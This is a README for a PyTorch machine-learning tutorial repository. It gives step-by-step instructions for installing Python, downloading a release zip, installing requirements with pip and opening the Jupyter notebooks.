## 📖 Description
Welcome to **PyTorch-ML-Concepts**! This is a comprehensive collection of Machine Learning and Deep Learning models built from scratch using Python and PyTorch. Whether you're a beginner or looking to enhance your knowledge, this project offers well-documented tutorials and examples to help you understand core concepts effectively.

## 🚀 Getting Started

To get started with PyTorch-ML-Concepts, follow these steps:

1. **Download and Install Python**   
   If you do not have Python installed, you need to download it from the official website: [Download Python](https://www.python.org/downloads/). Follow the installation instructions provided for your operating system. Ensure you select the option to add Python to your system's PATH.

2. **Visit the Releases Page**  
   Go to the Releases page to download the latest version of PyTorch-ML-Concepts: [Visit this page to download](https://github.com/Faria-Mehzabin/PyTorch-ML-Concepts/releases).

3. **Download a Release**  
   On the Releases page, you will find different versions of the project. Click on the latest version's link. You will see a list of assets available for download. Download the zip file or the appropriate package for your operating system.

4. **Extract the Files**  
   Once the download is complete, locate the zip file in your computer's downloads folder. Right-click on the zip file and choose "Extract All" to unpack its contents to a new folder.

5. **Open a Terminal or Command Prompt**  
   For Windows, you can open Command Prompt by searching for "cmd" in the Start menu. For Mac or Linux, open the Terminal application.

6. **Navigate to the Project Directory**  
   Using the terminal or command prompt, navigate to the directory where you extracted the contents. You can do this by typing `cd path/to/the/directory` and pressing Enter. Replace "path/to/the/directory" with the actual path.

7. **Install Required Packages**  
   You will need to install some additional Python packages to run the models. Type the following command and press Enter:

   ```
   pip install -r requirements.txt
   ```

8. **Run the Example Notebooks**  
   With everything set up, you can start exploring the projects. Navigate to the `notebooks` folder and open any Jupyter notebook by using the following command:

   ```
   jupyter notebook
   ```

   This command will open a new tab in your web browser. Select the notebook you want to run, and you can start learning!
